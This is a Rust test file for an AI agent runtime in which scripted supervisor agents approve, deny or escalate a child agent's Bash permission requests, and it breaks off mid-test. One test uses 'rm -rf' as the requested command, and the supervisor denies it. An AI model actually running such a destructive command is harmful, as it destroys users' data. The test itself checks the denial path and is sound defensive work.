use anyhow::Result;
use serde_json::Value;
use std::path::PathBuf;
use tokio::sync::mpsc;

use super::supervision::peer_notice;
use super::{AgentConfig, AgentIo, Backend, LoopInput, run_agent};
use crate::core::events::{AgentEvent, ControllerEvent, UiEvent};
use crate::core::host::Controller;
use crate::core::identity::{ClientIdentity, ClientKind};
use crate::core::peer::{PeerFactory, PeerRegistration, PeerSet};
use crate::core::session::Session;
use crate::core::store::{SessionState, SessionStore};
use crate::core::{SessionHandle, SessionHost};
use crate::llm::{ContentBlock, Message, Provider, Request, Response, SystemBlock, Usage};

struct FakeProvider;
impl Provider for FakeProvider {
    async fn complete(&self, _req: &Request<'_>) -> Result<Response> {
        Ok(Response {
            content: vec![ContentBlock::Text { text: "ok".into() }],
            stop_reason: "end_turn".into(),
            usage: Usage::default(),
            container_id: None,
            warning: None,
            context_cleared: None,
        })
    }
    async fn count_tokens(&self, _req: &Request<'_>) -> Result<u64> {
        Ok(0)
    }
}

struct RecordingProvider {
    seen: std::sync::Arc<std::sync::Mutex<Vec<Message>>>,
}
impl Provider for RecordingProvider {
    async fn complete(&self, req: &Request<'_>) -> Result<Response> {
        *self.seen.lock().unwrap() = req.messages.to_vec();
        Ok(Response {
            content: vec![ContentBlock::Text { text: "ok".into() }],
            stop_reason: "end_turn".into(),
            usage: Usage::default(),
            container_id: None,
            warning: None,
            context_cleared: None,
        })
    }
    async fn count_tokens(&self, _req: &Request<'_>) -> Result<u64> {
        Ok(0)
    }
}

// Panics once its scripted responses run out, so an unexpected extra call fails the test.
struct ScriptedProvider {
    responses: std::sync::Mutex<Vec<Response>>,
    seen_messages: std::sync::Arc<std::sync::Mutex<Vec<Message>>>,
    seen_tools: std::sync::Arc<std::sync::Mutex<Vec<String>>>,
}
impl Provider for ScriptedProvider {
    async fn complete(&self, req: &Request<'_>) -> Result<Response> {
        *self.seen_messages.lock().unwrap() = req.messages.to_vec();
        *self.seen_tools.lock().unwrap() = req
            .tools
            .iter()
            .filter_map(|t| t.get("name").and_then(Value::as_str).map(String::from))
            .collect();
        Ok(self.responses.lock().unwrap().remove(0))
    }
    async fn count_tokens(&self, _req: &Request<'_>) -> Result<u64> {
        Ok(0)
    }
}

struct SystemLogProvider {
    responses: std::sync::Mutex<Vec<Response>>,
    seen_system: std::sync::Arc<std::sync::Mutex<Vec<Vec<String>>>>,
}
impl Provider for SystemLogProvider {
    async fn complete(&self, req: &Request<'_>) -> Result<Response> {
        self.seen_system
            .lock()
            .unwrap()
            .push(req.system.iter().map(|b| b.text.clone()).collect());
        Ok(self.responses.lock().unwrap().remove(0))
    }
    async fn count_tokens(&self, _req: &Request<'_>) -> Result<u64> {
        Ok(0)
    }
}

fn tool_use_response(name: &str, input: Value) -> Response {
    Response {
        content: vec![ContentBlock::ToolUse {
            id: "tu1".into(),
            name: name.into(),
            input,
        }],
        stop_reason: "tool_use".into(),
        usage: Usage::default(),
        container_id: None,
        warning: None,
        context_cleared: None,
    }
}

fn end_turn_response(text: &str) -> Response {
    Response {
        content: vec![ContentBlock::Text { text: text.into() }],
        stop_reason: "end_turn".into(),
        usage: Usage::default(),
        container_id: None,
        warning: None,
        context_cleared: None,
    }
}

// `fail_on` is 1-indexed.
struct FailOnNthProvider {
    calls: std::sync::Mutex<usize>,
    fail_on: usize,
}
impl Provider for FailOnNthProvider {
    async fn complete(&self, _req: &Request<'_>) -> Result<Response> {
        let mut n = self.calls.lock().unwrap();
        *n += 1;
        if *n == self.fail_on {
            anyhow::bail!("simulated provider failure");
        }
        Ok(end_turn_response("ok"))
    }
    async fn count_tokens(&self, _req: &Request<'_>) -> Result<u64> {
        Ok(0)
    }
}

struct FakeBackend;
impl Backend for FakeBackend {
    fn system_blocks(&self) -> Vec<SystemBlock> {
        Vec::new()
    }
    fn tool_schemas(&self) -> (Vec<Value>, Option<usize>) {
        (Vec::new(), None)
    }
    fn tool_summary(&self, _name: &str, _input: &Value) -> String {
        String::new()
    }
    fn requires_permission(&self, name: &str) -> bool {
        name == "GatedTool"
    }
    fn permission_summary(&self, _name: &str, _input: &Value) -> String {
        String::new()
    }
    async fn execute(
        &mut self,
        _name: &str,
        _input: &Value,
        _notify: &mpsc::Sender<AgentEvent>,
    ) -> Result<String> {
        Ok(String::new())
    }
    async fn handle_mcp(
        &mut self,
        _cmd: &super::McpCommand,
        _notify: &mpsc::Sender<AgentEvent>,
    ) -> String {
        String::new()
    }
    fn mcp_catalog(&self) -> Vec<crate::core::McpServerInfo> {
        Vec::new()
    }
}

fn mk_cfg() -> AgentConfig {
    AgentConfig {
        model: "fake-model".into(),
        max_tokens: 64,
        max_iterations: 4,
        thinking_display: "omitted".into(),
        models: Vec::new(),
    }
}

fn mk_session() -> (Session, PathBuf) {
    let dir = std::env::temp_dir().join(format!("nudge-agent-{}", uuid::Uuid::new_v4()));
    std::fs::create_dir_all(&dir).unwrap();
    let store = SessionStore::open(&dir.join("nudge.db")).unwrap();
    let session = Session::create(dir.clone(), store).unwrap();
    (session, dir)
}

fn agent_who(name: &str) -> ClientIdentity {
    ClientIdentity {
        kind: ClientKind::Agent,
        name: name.into(),
        session_id: None,
        task: None,
    }
}

fn mk_io(
    ui_rx: mpsc::Receiver<LoopInput>,
    agent_tx: mpsc::Sender<AgentEvent>,
    peers: PeerSet,
    peer_register_rx: Option<mpsc::UnboundedReceiver<PeerRegistration>>,
) -> AgentIo {
    AgentIo {
        ui_rx,
        agent_tx,
        peers,
        peer_register_rx,
        peer_factory: None,
        peer_dialer: None,
        self_handle: crate::core::host::spawn_bare_broker(Vec::new()).handle,
        multi_driver: std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false)),
    }
}

// The loop's Controller, plus far ends to inject peer events and see what the loop sends.
fn fake_peer() -> (
    Controller,
    mpsc::UnboundedSender<ControllerEvent>,
    mpsc::Receiver<UiEvent>,
) {
    let (ev_tx, ev_rx) = mpsc::unbounded_channel();
    let (ui_tx, ui_rx) = mpsc::channel(16);
    (
        Controller {
            events: ev_rx,
            ui_tx,
        },
        ev_tx,
        ui_rx,
    )
}

#[tokio::test]
async fn peer_activity_surfaces_as_a_notice() {
    let (session, dir) = mk_session();
    let (ui_tx, ui_rx) = mpsc::channel(16);
    let (agent_tx, mut agent_rx) = mpsc::channel(16);
    let (reg_tx, reg_rx) = mpsc::unbounded_channel();
    let task = tokio::spawn(run_agent(
        mk_cfg(),
        FakeProvider,
        FakeBackend,
        session,
        Vec::new(),
        mk_io(ui_rx, agent_tx, PeerSet::default(), Some(reg_rx)),
    ));

    let (peer_ctrl, peer_ev, _peer_ui) = fake_peer();
    reg_tx
        .send(supervised_reg(peer_ctrl, agent_who("child-1")))
        .unwrap();
    peer_ev
        .send(ControllerEvent::AssistantText {
            text: "peer working".into(),
        })
        .unwrap();

    let mut saw = None;
    while let Some(ev) = agent_rx.recv().await {
        if let AgentEvent::Notice { text } = ev {
            if text.contains("connected to peer") {
                continue;
            }
            saw = Some(text);
            break;
        }
    }
    let text = saw.expect("expected a peer activity Notice");
    assert!(
        text.contains("child-1"),
        "notice should name the peer: {text}"
    );
    assert!(
        text.contains("peer working"),
        "notice should carry the activity: {text}"
    );

    ui_tx.send((None, UiEvent::Quit)).await.unwrap();
    task.await.unwrap().unwrap();
    std::fs::remove_dir_all(&dir).ok();
}

// Uses the real `SessionHost::spawn` wiring (`PeerWiring.register_rx`), not `mk_io`.
#[tokio::test]
async fn runtime_registration_through_spawn_wiring_lands_in_the_loop() {
    use crate::core::PeerWiring;

    let (session, dir) = mk_session();
    let (peer_reg_tx, peer_reg_rx) = mpsc::unbounded_channel();
    let host = SessionHost::spawn(
        mk_cfg(),
        FakeProvider,
        FakeBackend,
        session,
        Vec::new(),
        Vec::new(),
        PeerWiring {
            factory: None,
            initial_peers: PeerSet::default(),
            register_rx: Some(peer_reg_rx),
            dialer: None,
        },
    );

    let mut ctrl = host
        .attach(ClientIdentity::human("watcher"))
        .await
        .expect("initial attach");

    let (peer_ctrl, _peer_ev, _peer_ui) = fake_peer();
    peer_reg_tx
        .send(PeerRegistration::new(peer_ctrl, agent_who("remote-1")))
        .unwrap();

    let saw_peer = tokio::time::timeout(std::time::Duration::from_secs(5), async {
        let mut saw_notice = false;
        loop {
            match ctrl.events.recv().await {
                Some(ControllerEvent::Notice { text })
                    if text.contains("connected to peer remote-1") =>
                {
                    saw_notice = true;
                }
                Some(ControllerEvent::Capabilities { peers, .. })
                    if peers.iter().any(|p| p.name == "remote-1") =>
                {
                    break saw_notice;
                }
                Some(_) => continue,
                None => break false,
            }
        }
    })
    .await
    .expect("timed out waiting for the peer to appear in Capabilities");
    assert!(
        saw_peer,
        "the registered peer must appear in the roster and announce a connect Notice"
    );

    host.shutdown().await.unwrap();
    std::fs::remove_dir_all(&dir).ok();
}

// A stub dialer stands in for the network: it records the code and registers a peer.
#[tokio::test]
async fn connect_peer_command_invokes_dialer_and_registers_edge() {
    use crate::core::{BrokerHandle, PeerDialer, PeerWiring};

    let (session, dir) = mk_session();
    let (reg_tx, reg_rx) = mpsc::unbounded_channel::<PeerRegistration>();
    let (code_tx, mut code_rx) = mpsc::unbounded_channel::<String>();

    let dialer: PeerDialer = Box::new(move |code: String, _self: BrokerHandle| {
        let reg_tx = reg_tx.clone();
        let code_tx = code_tx.clone();
        Box::pin(async move {
            let _ = code_tx.send(code);
            let (ev_tx, ev_rx) = mpsc::unbounded_channel::<ControllerEvent>();
            let (ui_tx, ui_rx) = mpsc::channel::<UiEvent>(16);
            // Hold the far ends so the registered peer isn't reaped before we observe it.
            tokio::spawn(async move {
                let _keep = (ev_tx, ui_rx);
                std::future::pending::<()>().await;
            });
            reg_tx
                .send(PeerRegistration::new(
                    Controller {
                        events: ev_rx,
                        ui_tx,
                    },
                    agent_who("remote-peer"),
                ))
                .map_err(|_| anyhow::anyhow!("loop gone"))?;
            Ok(())
        })
    });

    let host = SessionHost::spawn(
        mk_cfg(),
        FakeProvider,
        FakeBackend,
        session,
        Vec::new(),
        Vec::new(),
        PeerWiring {
            factory: None,
            initial_peers: PeerSet::default(),
            register_rx: Some(reg_rx),
            dialer: Some(dialer),
        },
    );
    let mut ctrl = host
        .attach(ClientIdentity::human("watcher"))
        .await
        .expect("attach");

    ctrl.ui_tx
        .send(UiEvent::Command {
            line: "/connect-peer nudge:pastedcode".into(),
        })
        .await
        .unwrap();

    let got = tokio::time::timeout(std::time::Duration::from_secs(5), code_rx.recv())
        .await
        .expect("dialer was not invoked")
        .expect("code");
    assert_eq!(got, "nudge:pastedcode");

    let landed = tokio::time::timeout(std::time::Duration::from_secs(5), async {
        loop {
            match ctrl.events.recv().await {
                Some(ControllerEvent::Capabilities { peers, .. })
                    if peers.iter().any(|p| p.name == "remote-peer") =>
                {
                    break true;
                }
                Some(_) => continue,
                None => break false,
            }
        }
    })
    .await
    .expect("timed out waiting for the peer in Capabilities");
    assert!(landed, "the dialed peer must appear in the roster");

    // A session reference is routed by the composition root, so it arrives untouched.
    ctrl.ui_tx
        .send(UiEvent::Command {
            line: "/connect-peer  my-session ".into(),
        })
        .await
        .unwrap();
    let got = tokio::time::timeout(std::time::Duration::from_secs(5), code_rx.recv())
        .await
        .expect("dialer was not invoked")
        .expect("reference");
    assert_eq!(got, "my-session");

    host.shutdown().await.unwrap();
    std::fs::remove_dir_all(&dir).ok();
}

async fn notice_containing(ctrl: &mut Controller, want: &str) {
    tokio::time::timeout(std::time::Duration::from_secs(5), async {
        loop {
            match ctrl.events.recv().await {
                Some(ControllerEvent::Notice { text }) if text.contains(want) => break,
                Some(_) => continue,
                None => panic!("the session ended"),
            }
        }
    })
    .await
    .unwrap_or_else(|_| panic!("no Notice containing {want:?}"));
}

#[tokio::test]
async fn a_failed_connect_peer_is_a_notice_and_the_session_carries_on() {
    use crate::core::{BrokerHandle, PeerDialer, PeerWiring};

    let (session, dir) = mk_session();
    let dialer: PeerDialer = Box::new(|_target: String, _self: BrokerHandle| {
        Box::pin(async { Err(anyhow::anyhow!("session worker didn't start")) })
    });
    let host = SessionHost::spawn(
        mk_cfg(),
        FakeProvider,
        FakeBackend,
        session,
        Vec::new(),
        Vec::new(),
        PeerWiring {
            factory: None,
            initial_peers: PeerSet::default(),
            register_rx: None,
            dialer: Some(dialer),
        },
    );
    let mut ctrl = host.attach(ClientIdentity::human("me")).await.unwrap();

    ctrl.ui_tx
        .send(UiEvent::Command {
            line: "/connect-peer worker".into(),
        })
        .await
        .unwrap();
    notice_containing(
        &mut ctrl,
        "could not connect to peer: session worker didn't start",
    )
    .await;

    ctrl.ui_tx
        .send(UiEvent::Command {
            line: "/peers".into(),
        })
        .await
        .unwrap();
    notice_containing(&mut ctrl, "peer").await;

    host.shutdown().await.unwrap();
    std::fs::remove_dir_all(&dir).ok();
}

fn supervised_reg(controller: Controller, who: ClientIdentity) -> PeerRegistration {
    PeerRegistration {
        controller,
        who,
        host: None,
        supervised: true,
        spawner: false,
    }
}

#[tokio::test]
async fn supervised_check_in_is_steered_to_approval() {
    let (session, dir) = mk_session();
    let seen_messages = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let seen_tools = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let provider = ScriptedProvider {
        responses: std::sync::Mutex::new(vec![
            tool_use_response("RespondToPeer", serde_json::json!({"verdict": "approve"})),
            end_turn_response("ok"),
        ]),
        seen_messages: seen_messages.clone(),
        seen_tools: seen_tools.clone(),
    };

    let mut peers = PeerSet::default();
    let (peer_ctrl, peer_ev, mut peer_ui) = fake_peer();
    peers.register(supervised_reg(peer_ctrl, agent_who("child-1")));

    let (ui_tx, ui_rx) = mpsc::channel(16);
    let (agent_tx, mut agent_rx) = mpsc::channel(16);
    let task = tokio::spawn(run_agent(
        mk_cfg(),
        provider,
        FakeBackend,
        session,
        Vec::new(),
        mk_io(ui_rx, agent_tx, peers, None),
    ));

    // Some activity first, so the check-in has a digest to carry.
    peer_ev
        .send(ControllerEvent::ToolUseStart {
            id: "c1".into(),
            name: "Bash".into(),
            summary: "listing files".into(),
        })
        .unwrap();
    peer_ev
        .send(ControllerEvent::PermissionRequest {
            tool_use_id: "t1".into(),
            tool_name: "Bash".into(),
            summary: "run ls".into(),
        })
        .unwrap();

    match peer_ui.recv().await {
        Some(UiEvent::PermissionResponse { tool_use_id, allow }) => {
            assert_eq!(tool_use_id, "t1");
            assert!(allow);
        }
        other => panic!("expected the approve routed to the peer, got {other:?}"),
    }

    let transcript = seen_messages.lock().unwrap().clone();
    let checkin = match &transcript[0].content[0] {
        ContentBlock::Text { text } => text.clone(),
        other => panic!("expected the check-in turn, got {other:?}"),
    };
    assert!(
        checkin.contains("[check-in from peer child-1]"),
        "{checkin}"
    );
    assert!(checkin.contains("run ls"), "{checkin}");
    assert!(
        checkin.contains("requested Bash: listing files"),
        "{checkin}"
    );
    // The verdict tool is asked for in the prompt, since newer models reject a forced
    // tool_choice.
    assert!(checkin.contains("by calling RespondToPeer"), "{checkin}");

    // The real call must be recorded: a check-in answered by plain text would teach the
    // model to answer the next one with text instead of the tool.
    ui_tx
        .send((None, UiEvent::UserMessage { text: "hi".into() }))
        .await
        .unwrap();
    while let Some(ev) = agent_rx.recv().await {
        if matches!(ev, AgentEvent::TurnComplete) {
            break;
        }
    }
    let transcript = seen_messages.lock().unwrap().clone();
    assert_eq!(transcript.len(), 5, "{transcript:?}");
    let roles: Vec<&str> = transcript.iter().map(|m| m.role.as_str()).collect();
    assert_eq!(roles, ["user", "assistant", "user", "assistant", "user"]);
    match &transcript[1].content[..] {
        [ContentBlock::ToolUse { id, name, input }] => {
            assert_eq!(id, "tu1");
            assert_eq!(name, "RespondToPeer");
            assert_eq!(input, &serde_json::json!({"verdict": "approve"}));
        }
        other => panic!("expected the recorded RespondToPeer call, got {other:?}"),
    }
    match &transcript[2].content[..] {
        [
            ContentBlock::ToolResult {
                tool_use_id,
                content,
                is_error,
            },
        ] => {
            assert_eq!(tool_use_id, "tu1");
            assert!(
                content.contains("Approved child-1's Bash call"),
                "{content}"
            );
            assert!(!is_error);
        }
        other => panic!("expected the call's tool_result, got {other:?}"),
    }
    match &transcript[3].content[..] {
        [ContentBlock::Text { text }] => {
            assert!(text.contains("Approved child-1's Bash call"), "{text}")
        }
        other => panic!("expected the assistant close, got {other:?}"),
    }

    ui_tx.send((None, UiEvent::Quit)).await.unwrap();
    task.await.unwrap().unwrap();
    std::fs::remove_dir_all(&dir).ok();
}

// The peer pauses on denial, so the redirect arrives as its fresh instruction.
#[tokio::test]
async fn steering_deny_redirects_the_peer() {
    let (session, dir) = mk_session();
    let seen_messages = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let seen_tools = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let provider = ScriptedProvider {
        responses: std::sync::Mutex::new(vec![tool_use_response(
            "RespondToPeer",
            serde_json::json!({"verdict": "deny", "message": "use Grep instead"}),
        )]),
        seen_messages: seen_messages.clone(),
        seen_tools: seen_tools.clone(),
    };

    let mut peers = PeerSet::default();
    let (peer_ctrl, peer_ev, mut peer_ui) = fake_peer();
    peers.register(supervised_reg(peer_ctrl, agent_who("child-1")));

    let (ui_tx, ui_rx) = mpsc::channel(16);
    let (agent_tx, _agent_rx) = mpsc::channel(16);
    let task = tokio::spawn(run_agent(
        mk_cfg(),
        provider,
        FakeBackend,
        session,
        Vec::new(),
        mk_io(ui_rx, agent_tx, peers, None),
    ));

    peer_ev
        .send(ControllerEvent::PermissionRequest {
            tool_use_id: "t1".into(),
            tool_name: "Bash".into(),
            summary: "rm -rf".into(),
        })
        .unwrap();

    match peer_ui.recv().await {
        Some(UiEvent::PermissionResponse { tool_use_id, allow }) => {
            assert_eq!(tool_use_id, "t1");
            assert!(!allow);
        }
        other => panic!("expected the deny routed to the peer, got {other:?}"),
    }
    match peer_ui.recv().await {
        Some(UiEvent::UserMessage { text }) => assert_eq!(text, "use Grep instead"),
        other => panic!("expected the redirect message, got {other:?}"),
    }

    ui_tx.send((None, UiEvent::Quit)).await.unwrap();
    task.await.unwrap().unwrap();
    std::fs::remove_dir_all(&dir).ok();
}

#[tokio::test]
async fn steering_escalates_to_the_human() {
    let (session, dir) = mk_session();
    let seen_messages = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let seen_tools = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let provider = ScriptedProvider {
        responses: std::sync::Mutex::new(vec![tool_use_response(
            "RespondToPeer",
            serde_json::json!({"verdict": "escalate"}),
        )]),
        seen_messages: seen_messages.clone(),
        seen_tools: seen_tools.clone(),
    };

    let mut peers = PeerSet::default();
    let (peer_ctrl, peer_ev, mut peer_ui) = fake_peer();
    peers.register(supervised_reg(peer_ctrl, agent_who("child-1")));

    let (ui_tx, ui_rx) = mpsc::channel(16);
    let (agent_tx, mut agent_rx) = mpsc::channel(16);
    let task = tokio::spawn(run_agent(
        mk_cfg(),
        provider,
        FakeBackend,
        session,
        Vec::new(),
        mk_io(ui_rx, agent_tx, peers, None),
    ));

    peer_ev
        .send(ControllerEvent::PermissionRequest {
            tool_use_id: "t1".into(),
            tool_name: "Bash".into(),
            summary: "push to main".into(),
        })
        .unwrap();

    loop {
        match agent_rx.recv().await {
            Some(AgentEvent::PermissionRequest {
                tool_use_id,
                summary,
                respond,
                ..
            }) => {
                assert_eq!(tool_use_id, "t1");
                assert!(summary.contains("peer child-1"), "{summary}");
                respond.send(true).unwrap();
                break;
            }
            Some(_) => {}
            None => panic!("loop ended before escalation"),
        }
    }
    match peer_ui.recv().await {
        Some(UiEvent::PermissionResponse { allow, .. }) => assert!(allow),
        other => panic!("expected the human's answer routed to the peer, got {other:?}"),
    }

    ui_tx.send((None, UiEvent::Quit)).await.unwrap();
    task.await.unwrap().unwrap();
    std::fs::remove_dir_all(&dir).ok();
}

// Returns the escalation's summary and the Notices emitted before it.
async fn answer_escalation(
    agent_rx: &mut mpsc::Receiver<AgentEvent>,
    allow: bool,
) -> (String, Vec<String>) {
    let mut notices = Vec::new();
    loop {
        match agent_rx.recv().await {
            Some(AgentEvent::PermissionRequest {
                summary, respond, ..
            }) => {
                respond.send(allow).unwrap();
                return (summary, notices);
            }
            Some(AgentEvent::Notice { text }) => notices.push(text),
            Some(_) => {}
            None => panic!("loop ended before escalation"),
        }
    }
}

// No verdict is not a silent deny: it escalates to the human, and the dangling check-in
// is rolled back so the next human turn starts clean.
#[tokio::test]
async fn steering_without_verdict_retries_then_escalates() {
    let (session, dir) = mk_session();
    let seen_messages = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let seen_tools = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let provider = ScriptedProvider {
        responses: std::sync::Mutex::new(vec![
            end_turn_response("hmm, tricky"),
            end_turn_response("still thinking"),
            end_turn_response("ok"),
        ]),
        seen_messages: seen_messages.clone(),
        seen_tools: seen_tools.clone(),
    };

    let mut peers = PeerSet::default();
    let (peer_ctrl, peer_ev, mut peer_ui) = fake_peer();
    peers.register(supervised_reg(peer_ctrl, agent_who("child-1")));

    let (ui_tx, ui_rx) = mpsc::channel(16);
    let (agent_tx, mut agent_rx) = mpsc::channel(16);
    let task = tokio::spawn(run_agent(
        mk_cfg(),
        provider,
        FakeBackend,
        session,
        Vec::new(),
        mk_io(ui_rx, agent_tx, peers, None),
    ));

    peer_ev
        .send(ControllerEvent::PermissionRequest {
            tool_use_id: "t1".into(),
            tool_name: "Bash".into(),
            summary: "run ls".into(),
        })
        .unwrap();

    let (summary, notices) = answer_escalation(&mut agent_rx, false).await;
    assert!(summary.contains("peer child-1"), "{summary}");
    assert!(
        notices
            .iter()
            .any(|n| n.contains("steering returned no valid verdict")),
        "{notices:?}"
    );
    match peer_ui.recv().await {
        Some(UiEvent::PermissionResponse { tool_use_id, allow }) => {
            assert_eq!(tool_use_id, "t1");
            assert!(!allow);
        }
        other => panic!("expected the human's deny routed to the peer, got {other:?}"),
    }

    ui_tx
        .send((None, UiEvent::UserMessage { text: "hi".into() }))
        .await
        .unwrap();
    while let Some(ev) = agent_rx.recv().await {
        if matches!(ev, AgentEvent::TurnComplete) {
            break;
        }
    }
    let transcript = seen_messages.lock().unwrap().clone();
    assert_eq!(transcript.len(), 1, "{transcript:?}");

    ui_tx.send((None, UiEvent::Quit)).await.unwrap();
    task.await.unwrap().unwrap();
    std::fs::remove_dir_all(&dir).ok();
}

#[tokio::test]
async fn steering_retries_a_missing_verdict() {
    let (session, dir) = mk_session();
    let seen_messages = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let seen_tools = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let provider = ScriptedProvider {
        responses: std::sync::Mutex::new(vec![
            end_turn_response("hmm, tricky"),
            tool_use_response("RespondToPeer", serde_json::json!({"verdict": "approve"})),
        ]),
        seen_messages: seen_messages.clone(),
        seen_tools: seen_tools.clone(),
    };

    let mut peers = PeerSet::default();
    let (peer_ctrl, peer_ev, mut peer_ui) = fake_peer();
    peers.register(supervised_reg(peer_ctrl, agent_who("child-1")));

    let (ui_tx, ui_rx) = mpsc::channel(16);
    let (agent_tx, mut agent_rx) = mpsc::channel(16);
    let task = tokio::spawn(run_agent(
        mk_cfg(),
        provider,
        FakeBackend,
        session,
        Vec::new(),
        mk_io(ui_rx, agent_tx, peers, None),
    ));

    peer_ev
        .send(ControllerEvent::PermissionRequest {
            tool_use_id: "t1".into(),
            tool_name: "Bash".into(),
            summary: "run ls".into(),
        })
        .unwrap();

    match peer_ui.recv().await {
        Some(UiEvent::PermissionResponse { allow, .. }) => assert!(allow),
        other => panic!("expected the retried approve, got {other:?}"),
    }

    ui_tx.send((None, UiEvent::Quit)).await.unwrap();
    task.await.unwrap().unwrap();
    while let Ok(ev) = agent_rx.try_recv() {
        assert!(
            !matches!(ev, AgentEvent::PermissionRequest { .. }),
            "a recovered verdict must not escalate"
        );
    }
    std::fs::remove_dir_all(&dir).ok();
}

// Stops a child rubber-stamping its parent's gated calls. Peer events are FIFO, so the
// peer's Error Notice is a sentinel proving the prompt was processed (silently).
#[tokio::test]
async fn unsupervised_check_in_is_not_answered() {
    let (session, dir) = mk_session();
    let (ui_tx, ui_rx) = mpsc::channel(16);
    let (agent_tx, mut agent_rx) = mpsc::channel(16);

    let mut peers = PeerSet::default();
    let (peer_ctrl, peer_ev, mut peer_ui) = fake_peer();
    peers.register(PeerRegistration::new(peer_ctrl, agent_who("parent-1")));

    let task = tokio::spawn(run_agent(
        mk_cfg(),
        FakeProvider,
        FakeBackend,
        session,
        Vec::new(),
        mk_io(ui_rx, agent_tx, peers, None),
    ));

    peer_ev
        .send(ControllerEvent::PermissionRequest {
            tool_use_id: "t1".into(),
            tool_name: "Bash".into(),
            summary: "run ls".into(),
        })
        .unwrap();
    peer_ev
        .send(ControllerEvent::Error {
            message: "sentinel".into(),
        })
        .unwrap();

    loop {
        match agent_rx.recv().await {
            Some(AgentEvent::Notice { text }) if text.contains("sentinel") => break,
            Some(AgentEvent::Notice { text }) => {
                assert!(
                    !text.contains("asks to use"),
                    "unsupervised prompt must not narrate: {text}"
                );
            }
            Some(_) => {}
            None => panic!("expected the sentinel Notice"),
        }
    }

    ui_tx.send((None, UiEvent::Quit)).await.unwrap();
    task.await.unwrap().unwrap();
    assert!(peer_ui.recv().await.is_none(), "peer must not be answered");
    std::fs::remove_dir_all(&dir).ok();
}

#[tokio::test]
async fn dismiss_peer_ends_the_supervised_child() {
    let (session, dir) = mk_session();
    let seen_messages = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let seen_tools = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let provider = ScriptedProvider {
        responses: std::sync::Mutex::new(vec![
            tool_use_response("DismissPeer", serde_json::json!({"peer": "child-1"})),
            end_turn_response("done"),
        ]),
        seen_messages: seen_messages.clone(),
        seen_tools: seen_tools.clone(),
    };

    let mut peers = PeerSet::default();
    let (peer_ctrl, peer_ev, _peer_ui) = fake_peer();
    peers.register(supervised_reg(peer_ctrl, agent_who("child-1")));

    let (ui_tx, ui_rx) = mpsc::channel(16);
    let (agent_tx, mut agent_rx) = mpsc::channel(16);
    let task = tokio::spawn(run_agent(
        mk_cfg(),
        provider,
        FakeBackend,
        session,
        Vec::new(),
        mk_io(ui_rx, agent_tx, peers, None),
    ));

    ui_tx
        .send((
            None,
            UiEvent::UserMessage {
                text: "dismiss the child".into(),
            },
        ))
        .await
        .unwrap();
    loop {
        match agent_rx.recv().await {
            Some(AgentEvent::PermissionRequest {
                tool_name, respond, ..
            }) => {
                assert_eq!(tool_name, "DismissPeer");
                respond.send(true).unwrap();
            }
            Some(AgentEvent::TurnComplete) => break,
            Some(_) => {}
            None => panic!("loop ended early"),
        }
    }

    assert!(
        peer_ev
            .send(ControllerEvent::Notice { text: "?".into() })
            .is_err(),
        "the dismissed peer's channel must be closed"
    );
    let transcript = seen_messages.lock().unwrap().clone();
    assert!(
        transcript.iter().any(|m| m.content.iter().any(|b| matches!(
            b,
            ContentBlock::ToolResult { content, is_error: false, .. }
                if content.contains("dismissed child-1")
        ))),
        "expected the dismissal record: {transcript:?}"
    );

    ui_tx.send((None, UiEvent::Quit)).await.unwrap();
    task.await.unwrap().unwrap();
    std::fs::remove_dir_all(&dir).ok();
}

// A crash writes nothing, so only the graceful-teardown transition is testable.
#[tokio::test]
async fn session_state_ends_on_teardown_and_runs_again_on_open() {
    let (session, dir) = mk_session();
    let id = session.id.clone();
    let state = |dir: &std::path::Path| {
        SessionStore::open(&dir.join("nudge.db"))
            .unwrap()
            .session(&id)
            .unwrap()
            .unwrap()
            .state
    };

    let (ui_tx, ui_rx) = mpsc::channel(16);
    let (agent_tx, _agent_rx) = mpsc::channel(16);
    let task = tokio::spawn(run_agent(
        mk_cfg(),
        FakeProvider,
        FakeBackend,
        session,
        Vec::new(),
        mk_io(ui_rx, agent_tx, PeerSet::default(), None),
    ));
    assert_eq!(state(&dir), SessionState::Running);

    ui_tx.send((None, UiEvent::Quit)).await.unwrap();
    task.await.unwrap().unwrap();
    assert_eq!(state(&dir), SessionState::Ended);

    let resumed = Session::open(
        &id,
        dir.clone(),
        SessionStore::open(&dir.join("nudge.db")).unwrap(),
    )
    .unwrap();
    assert_eq!(state(&dir), SessionState::Running);
    drop(resumed);

    std::fs::remove_dir_all(&dir).ok();
}

// Dropping the parent's Peer sends the child's host a Quit.
#[tokio::test]
async fn dismissed_child_session_row_reads_ended() {
    let (parent_session, parent_dir) = mk_session();
    let (child_session, child_dir) = mk_session();
    let child_id = child_session.id.clone();
    let child_host = SessionHost::spawn(
        mk_cfg(),
        FakeProvider,
        FakeBackend,
        child_session,
        Vec::new(),
        Vec::new(),
        crate::core::PeerWiring::default(),
    );
    let child_ctrl = child_host
        .attach(agent_who("parent"))
        .await
        .expect("attach to child");

    let mut peers = PeerSet::default();
    peers.register(PeerRegistration {
        controller: child_ctrl,
        who: agent_who("child-1"),
        host: Some(child_host),
        supervised: true,
        spawner: false,
    });

    let provider = ScriptedProvider {
        responses: std::sync::Mutex::new(vec![
            tool_use_response("DismissPeer", serde_json::json!({"peer": "child-1"})),
            end_turn_response("done"),
        ]),
        seen_messages: Default::default(),
        seen_tools: Default::default(),
    };
    let (ui_tx, ui_rx) = mpsc::channel(16);
    let (agent_tx, mut agent_rx) = mpsc::channel(16);
    let task = tokio::spawn(run_agent(
        mk_cfg(),
        provider,
        FakeBackend,
        parent_session,
        Vec::new(),
        mk_io(ui_rx, agent_tx, peers, None),
    ));

    ui_tx
        .send((
            None,
            UiEvent::UserMessage {
                text: "dismiss the child".into(),
            },
        ))
        .await
        .unwrap();
    loop {
        match agent_rx.recv().await {
            Some(AgentEvent::PermissionRequest { respond, .. }) => respond.send(true).unwrap(),
